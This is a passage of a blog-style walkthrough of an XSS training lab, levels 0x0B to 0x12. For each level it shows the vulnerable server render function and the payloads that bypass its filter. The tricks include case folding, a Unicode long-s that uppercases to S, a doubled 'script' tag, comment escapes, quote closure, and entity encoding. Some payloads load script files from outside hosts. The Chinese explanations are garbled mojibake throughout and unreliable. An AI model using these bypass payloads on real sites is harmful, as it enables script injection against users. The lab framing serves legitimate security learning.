<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><h4 id="server-code-11"><a href="#server-code-11" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h4><p><code>toUpperCase()</code>å‡½æ•°å°†æ‰€æœ‰å­—æ¯è½¬æ¢æˆå¤§å†™</p>
<p>å¯ä»¥ç”¨ä¸¤ç§æ–¹æ³•è¿›è¡Œç»•è¿‡</p>
<ul>
<li><p>htmlæ ‡ç­¾å¤§å°å†™æ— å½±å“ï¼›</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>Windows</code>æœåŠ¡å™¨å¯¹å¤§å°å†™ä¸æ•æ„Ÿè€Œ<code>Linux</code>æœåŠ¡å™¨å¯¹å¤§å°å†™æ•æ„Ÿã€‚ é€šè¿‡<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­çš„srcå¼•å…¥ï¼Œsrcä¸åŒºåˆ†å¤§å°å†™ã€‚<img src="xss/12.png" alt=""></p>
</li>
<li><p>jsä¸¥æ ¼åŒºåˆ†å¤§å°å†™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨unicodeç¼–ç è¿›è¡Œå¤§å°å†™ç»•è¿‡</p>
<p><img src="/img/xsslabs_13.png" alt=""></p>
</li>
</ul>
<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><h4 id="server-code-12"><a href="#server-code-12" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h4><p>åœ¨0x0Bçš„åŸºç¡€ä¸Šè¿‡æ»¤äº†ä¸€ä¸ª<code>script</code></p>
<p>å› æ­¤0x0Bçš„ç¬¬äºŒè§£è¿˜æ˜¯å¯ä»¥ç”¨</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨å¦å¤–ä¸€ç§æ–¹æ³•ï¼šåŒå†™<code>script</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;&lt;<span class="regexp">/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_14.png" alt=""></p>
<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><h4 id="server-code-13"><a href="#server-code-13" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h4><p>è¿™é‡Œæ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†<code>&lt;</code>å’Œ<code>/</code>å’Œ<code>&#39;</code>å’Œ<code>&quot;</code>ï¼Œä¸”xssä»£ç å—åœ¨æ³¨é‡ŠåŒº<code>//</code>å†…</p>
<p>//å¯ä»¥ç”¨æ¢è¡Œæ¥ç»•è¿‡</p>
<p>è€Œæ¢è¡Œåè¿˜æœ‰ä¸€ä¸ª<code>&#39;)</code>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨<code>--&gt;</code>å¯¹åé¢çš„ä»£ç è¿›è¡Œæ³¨é‡Šä»è€Œä¿è¯å‰é¢çš„ä»£ç æ­£å¸¸è¿è¡Œ</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><h4 id="server-code-14"><a href="#server-code-14" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h4><p>è¿™å„¿åŒ¹é…æ›¿æ¢<code>&lt;</code>å¼€å¤´åæ¥å­—æ¯çš„å­—ç¬¦ä¸²ï¼Œå°±æ˜¯æ‰€æœ‰çš„æ ‡ç­¾éƒ½ä¸èƒ½ç”¨ï¼Œå¹¶ä¸”å…¨éƒ¨è½¬äº†å¤§å†™ã€‚</p>
<p>ä½†æ˜¯æœ‰ä¸€ä¸ªæ¼æ´ï¼Œ<code>Å¿</code>ä¸æ˜¯è‹±æ–‡å­—æ¯å¹¶ä¸”è½¬æˆå¤§å†™ä»¥åæ˜¯<code>S</code>ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Å¿cript src=<span class="string">"https://xss.southseast.cc/myjs/copyright.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_15.png" alt=""></p>
<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><h4 id="server-code-15"><a href="#server-code-15" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h4><p>ä»ä»£ç å—å¯ä»¥çœ‹å‡ºè¿‡æ»¤äº†å¾ˆå¤šç¬¦å·ï¼Œä½†æ˜¯<code>&amp;#39;</code>è§£ç åä»»ç„¶æ˜¯<code>&#39;</code>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¿‡æ»¤æ˜¯ä¸èµ·ä½œç”¨çš„</p>
<p>è€Œxssä»£ç å—çš„ä½ç½®æ˜¯<code>console.error(&#39;&#39;)</code>ä¸­ï¼Œå› æ­¤å¯ä»¥é€šè¿‡é—­åˆæ¥ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;);alert(1)(&#39;</span><br></pre></td></tr></table></figure>

<p>åœ¨htmlé‡Œå°±æˆäº†è¿™æ ·</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span></span><br><span class="line">&lt;img src onerror=<span class="string">"console.error('123')"</span>&gt;</span><br><span class="line"><span class="string">');alert(1)('</span></span><br><span class="line">&lt;img src onerror=<span class="string">"console.error('');alert(1)('')"</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_16.png" alt=""></p>
<h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><h4 id="server-code-16"><a href="#server-code-16" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h4><p>è¾“å‡ºåœ¨<code>&lt;script&gt;</code>æ ‡ç­¾é‡Œé¢çš„<code>window.data =</code>é‡Œé¢ï¼Œæ— ä»»ä½•è¿‡æ»¤æªæ–½</p>
<p>å¯ä»¥ä½¿ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾é—­åˆæ¥ç»•è¿‡</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert(1)</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_17.png" alt=""></p>
<p>ä¹Ÿå¯ä»¥é—­åˆ<code>window.data =</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'1'</span>;alert(<span class="number">1</span>)</span><br><span class="line"><span class="string">''</span>;alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><h4 id="server-code-17"><a href="#server-code-17" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h4><p>è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ï¼Œä½†å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆå®è´¨æ€§çš„ä½œç”¨emmmmm</p>
<p>ç›´æ¥é—­åˆå°±ok</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(1)(&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_18.png" alt=""></p>
<h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><h4 id="server-code-18"><a href="#server-code-18" class="headerlink" title="server code"></a>server code</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h4><p>è¿™é‡Œå°†<code>&quot;</code>è½¬è¯‘æˆ<code>\&quot;</code></p>
<p>å› æ­¤åªè¦å†ä¼ å…¥ä¸€ä¸ª<code>\</code>æŠŠç¬¬ä¸€ä¸ª<code>\</code>è½¬ä¹‰æ‰å°±è¡Œäº†ã€‚</p>
<p>ä¹Ÿå¯ä»¥æ„é€ <code>&lt;script&gt;</code>æ ‡ç­¾æ¥é—­åˆã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">");alert(1)//"</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_20.png" alt=""></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">alert(1);</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/xsslabs_19.png" alt=""></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>åå°„æ€§xssçš„è®­ç»ƒå°±åˆ°è¿™é‡Œï¼Œæ„Ÿè§‰éƒ½æ˜¯é’ˆå¯¹è¿‡æ»¤ä»£ç çš„ç»•è¿‡ï¼Œä»¥åæœ‰æ—¶é—´å­¦ä¹ å­¦ä¹ å‚¨å­˜å‹å’ŒDOMå‹~</p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avater.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>comical</div>
      <div>2018-07-14</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/labs/">labs</a>

      <a class="tag-link" href="/tags/xss/" rel="tag">#xss</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
